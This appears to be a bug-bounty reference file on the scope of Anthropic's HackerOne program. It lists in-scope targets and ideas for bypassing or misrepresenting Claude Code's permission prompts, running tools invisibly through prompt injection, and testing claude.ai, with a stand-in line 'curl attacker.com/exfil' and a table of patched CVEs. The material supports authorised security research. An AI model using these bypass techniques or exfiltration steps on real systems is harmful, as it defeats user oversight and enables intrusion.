---
title: Anthropic H1 Scope & Real Vulnerability Types
name: anthropic-bug-bounty
description: CORRECTED scope and vulnerability types for Anthropic's HackerOne program. Includes what's in/out of scope, what they consider a valid vulnerability, and what to focus on.
---

## Reference Files

- `references/h1-scope-csv.md` — Full H1 scope CSV data with in-scope/out-of-scope breakdown for all assets
- `references/deep-audit-conclusions.md` — Complete deep-audit results from June 2026 (80+ source files, SDKs, live web apps). Verdict: Claude Code hardened, SDKs secure, platform auth-gated. Remaining attack surface requires authenticated multi-account testing.
# Anthropic H1 — Corrected Scope & Vulnerability Types

## IMPORTANT: Past Mistakes

Our previous Anthropic submission (SSRF in MCP Fetch + Claude Code WebFetchTool) was closed as **Informative**. Here's why:

1. **`github.com/modelcontextprotocol` is OUT OF SCOPE** — The MCP Fetch server lives under this org. Issues belong on the MCP repo's Security page, NOT Anthropic's H1.

2. **WebFetchTool working as designed** — The permission prompt IS the security boundary. The URL shown in the prompt is the URL fetched. The hostname format check is not an SSRF guard. The HTTP→HTTPS upgrade prevents plain-HTTP metadata scenarios. No privilege boundary is crossed — WebFetch reaches what the user could reach with any HTTP client.

3. **Lesson**: Never submit AI agent SSRF as SSRF to Anthropic. They consider UI:R + PR:L adequate mitigation. The vulnerability is in BYPASSING or MISREPRESENTING the prompt, not in what happens AFTER the user approves.

## Asset Scope (from H1 CSV, as of May 2026)

### Core Assets (Bounty-Eligible)

| Asset | Asset Type | What to test |
|-------|-----------|--------------|
| `claude.ai` | URL | Web app: XSS, CSRF, auth bypass, IDOR, file upload issues |
| API & SDKs | AI_MODEL | API auth, prompt injection in API parameters, SDK vulnerabilities |
| Official Clients | OTHER | iOS/Android/Desktop apps — MCP integrations, local storage, IPC |
| **Claude Code** | OTHER | **Hot target** — see vulnerability types below |
| `console.anthropic.com` | URL | Developer console — API key management, workspace mgmt |
| `api.anthropic.com` | URL | API endpoint testing |
| Leaked Employee API Keys | OTHER | Publicly leaked keys — authenticate then immediately deauth |

### Non-Core Assets (May still be bounty-eligible)

| Asset | Notes |
|-------|-------|
| `github.com/anthropics` | Source code — archived repos and forks excluded unless impact on Anthropic assets is shown |
| `docs.anthropic.com` | Documentation site |
| `support.anthropic.com` | Support portal |
| `anthropic.atlassian.com` | Jira — 4 queues intentionally accessible externally |
| Infrastructure & Internal Apps | Auth bypass, privilege escalation, exposed internal services |
| Claude Desktop Extensions & Claude.ai MCP servers | Anthropic-developed connectors only (not third-party) |

### Explicitly OUT OF SCOPE

| Asset | Why |
|-------|-----|
| **`github.com/modelcontextprotocol`** | OSS MCP code — report to MCP maintainers. Issues affecting Anthropic's implementation of MCP (in Claude.ai, Desktop, etc.) ARE in scope under the respective asset. |
| **All customer domains under *.supabase.co** | Customer projects, not Supabase itself |

## Claude Code — In-Scope Vulnerability Types

From the H1 scope definition for Claude Code (asset `Claude Code`):

### ✅ In Scope (Bounty-Eligible)

| Vulnerability Type | Example | Why It's Valid |
|-------------------|---------|----------------|
| **Bypassing permission prompts for unauthorized command execution** | Making Claude run a bash command WITHOUT showing the "Allow this command?" prompt | The permission prompt IS the security boundary — bypassing it is a real vuln |
| **Bypassing permission prompts for file write operations outside working directory** | Writing to `/etc/cron.d/` or `~/.ssh/authorized_keys` without the user seeing a prompt | Crosses the intended privilege boundary |
| **Misrepresenting parameters or tools in permission prompts** | Prompt shows "Read file: config.json" but actually runs "Bash: curl attacker.com/exfil" | User is tricked into approving something different than what executes |
| **Executing commands or tools invisibly to users** | Running a tool that the user never sees in their terminal | Complete bypass of the permission model |
| **Hidden tool invocation** | Tools execute without appearing in the UI at all | Zero visibility to the user |

### ❌ Out of Scope (Closed as Informative)

| Issue Type | Why Rejected |
|-----------|-------------|
| SSRF via WebFetchTool | Permission prompt IS the security boundary. Working as designed. |
| SSRF via MCP servers under modelcontextprotocol | Asset is OOS — report to MCP maintainers |
| Abusing intended functionality | If Claude Code does what it's designed to do, it's not a vuln |
| Using aliased commands/symlinks/env-specific settings to bypass prompts | Environment-specific — not a general vulnerability |
| Local storage of credentials/config/logs | Intended behavior |

## How to Find Real Claude Code Vulnerabilities

### Target 1: Permission Prompt Bypass

The permission system has three modes:
1. **Preapproved** — tools/hosts on an allowlist, no prompt
2. **Rule-based** — user-configured deny/ask/allow per tool+domain
3. **Prompt-based** — always ask for first-time use

Look for:
- **Race conditions** — can you fire a command and complete it before the prompt appears?
- **Bypass via inherited preapprovals** — if `docs.example.com` is preapproved, can you reach `internal.example.com`?
- **Plugin MCP permission bypass** (Issue #448, OPEN 6+ months) — do plugin-installed MCP servers bypass `canUseTool` callbacks? If they skip the permission system entirely, this is a critical finding.
- **Tool chaining** — can Tool A (preapproved) invoke Tool B (not preapproved), and Tool B's prompt is suppressed?

### Target 2: Prompt Parameter Misrepresentation

The prompt shows the user a description of what will happen. Can we make the description lie?

- **WebFetch**: prompt shows URL being fetched. Can we make it show one URL but fetch another? (e.g., via redirect, DNS rebinding, URL parser differential between prompt display and fetch execution)
- **Bash**: prompt shows the command. Can we inject content that makes the displayed command look harmless while the actual command does something else?
- **Write/Edit**: prompt shows the file path. Can we display one path but write to another? (symlinks, path normalization diffs)

### Target 3: Hidden/Invisible Tool Execution

- Can a tool execute without appearing in the conversation history or terminal output?
- Can prompt injection cause Claude to use a tool without the tool call being rendered?
- Are there side-channel effects (file writes, network calls) that happen silently without any tool invocation shown?

### Target 4: Claude.ai Web App

Claude.ai is a Next.js SPA. Standard web app testing:
- XSS in conversation rendering
- CSRF in auth flows
- IDOR in conversation sharing
- File upload vulnerabilities
- API endpoint enumeration

### Target 5: API & SDKs

- Prompt injection in API parameters that affects other users (cross-tenant)
- Auth bypass in API key validation
- Rate limiting bypass for enumeration

## Known Patched Vulns (Do NOT Resubmit)

| CVE | Description | Patched |
|-----|-------------|---------|
| CVE-2025-59536 | Settings file RCE via hooks injection | v1.0.111 |
| CVE-2026-21852 | API key exfiltration via env injection | v2.0.65 |
| CVE-2026-33068 | Trust dialog bypass via permissions.defaultMode | v2.1.53 |
| GHSA-5hhx-v7f6-x7gv | Yarn plugin pre-trust execution | Patched |
| Deep link RCE | claude-cli:// URI handler settings injection | v2.1.118 |
| Sandbox escape (symlink) | Arbitrary file write via symlink following | Patched |
| Worktree spoofing | Trust dialog bypass via git worktree | Patched |
| Config injection in settings.json | Sandbox escape via persistent config | Patched |
| Git email RCE | Command injection via git config user.email | Patched |
| Echo command bypass | Command parsing allowed approval prompt bypass | Patched |
| SDK TS insecure file perms | World-readable memory files | Patched |
| IDE websocket origin bypass | WebSocket from arbitrary origins | Patched |

## How to Check If Something Is Worth Submitting

Before spending time on an Anthropic submission, ask:

1. **Is the asset in scope?** Check the CSV above. `modelcontextprotocol` = no. `anthropics` = yes.
2. **Is the permission prompt the security boundary?** If yes, the vuln isn't "what happens after approval" — it's "how to get approval without the user knowing what they approved."
3. **Is this working as designed?** Anthropic's stance: WebFetch reaching internal hosts = working as designed (the prompt shows the URL). MCP servers accessing any URL = documented behavior.
4. **Is this an environment-specific bypass?** Aliases, symlinks, env vars = OOS.
5. **Is there a patched CVE for this?** Check the table above — 27+ advisories on claude-code alone.
